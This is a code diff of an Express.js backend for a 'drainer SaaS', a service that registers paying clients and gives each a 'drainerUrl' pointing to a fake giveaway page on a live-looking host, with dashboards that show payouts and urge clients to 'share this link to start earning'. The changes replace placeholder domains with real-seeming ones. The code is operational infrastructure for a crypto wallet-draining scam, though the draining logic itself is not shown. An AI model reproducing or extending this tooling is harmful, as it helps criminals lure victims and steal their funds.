@@ -87,12 +87,12 @@ app.post('/saas/register', (req, res) => {
     console.log(`🎯 New client registered: ${projectName} (${clientId})`);
     
     res.json({
-      success: true,
-      clientId: clientId,
-      domain: `https://${clientId}.drainersaas.com`,
-      adminUrl: `https://your-backend.com/saas/admin/${clientId}`,
-      message: 'Client registered successfully'
-    });
+  success: true,
+  clientId: clientId,
+  drainerUrl: `https://cheetah-giveaway.netlify.app/?client=${clientId}`,
+  dashboardUrl: `https://service-s816.onrender.com/saas/dashboard/${clientId}`,
+  message: 'Client registered successfully'
+});
     
   } catch (error) {
     console.error('Client registration error:', error);
@@ -174,13 +174,13 @@ app.post('/saas/v2/register', (req, res) => {
     console.log(`🎯 Enhanced client registered: ${projectName} (${clientId})`);
     
     res.json({
-      success: true,
-      clientId: clientId,
-      domain: `https://your-backend.onrender.com/saas/client/${clientId}`,
-      adminUrl: `https://your-backend.onrender.com/saas/admin/v2/${clientId}`,
-      dashboardUrl: `https://your-backend.onrender.com/saas/dashboard/${clientId}`,
-      message: 'Client registered successfully'
-    });
+  success: true,
+  clientId: clientId,
+  drainerUrl: `https://cheetah-giveaway.netlify.app/?client=${clientId}`,
+  dashboardUrl: `https://service-s816.onrender.com/saas/dashboard/${clientId}`,
+  message: 'Client registered successfully'
+});
+    
     
   } catch (error) {
     console.error('Enhanced registration error:', error);
@@ -829,8 +829,8 @@ app.get('/saas/dashboard/:clientId', (req, res) => {
 
     <script>
         function copyUrl() {
-            const url = 'https://your-backend.onrender.com/saas/client/${clientId}';
-            navigator.clipboard.writeText(url).then(() => {
+const url = 'https://cheetah-giveaway.netlify.app/?client=${clientId}';
+navigator.clipboard.writeText(url).then(() => {
                 alert('URL copied to clipboard!');
             });
         }
@@ -1632,8 +1632,8 @@ app.get('/saas/admin/:clientId', (req, res) => {
         </div>
         <div class="card">
             <h3>🔗 Your Drainer URL</h3>
-            <input type="text" value="https://your-backend.com/saas/client/${clientId}" readonly style="width: 100%; padding: 10px; margin: 10px 0;">
-            <p>Share this link to start earning!</p>
+<input type="text" value="https://cheetah-giveaway.netlify.app/?client=${clientId}" readonly style="width: 100%; padding: 10px; margin: 10px 0;">
+<p>Share this link to start earning!</p>
         </div>
         <div class="card">
             <h3>📊 Next Payout</h3>
@@ -4287,4 +4287,5 @@ app.use((req, res, next) => {
   console.log(`${new Date().toISOString()} - ${req.ip} - ${req.method} ${req.path}`);
   next();
 });
+
 
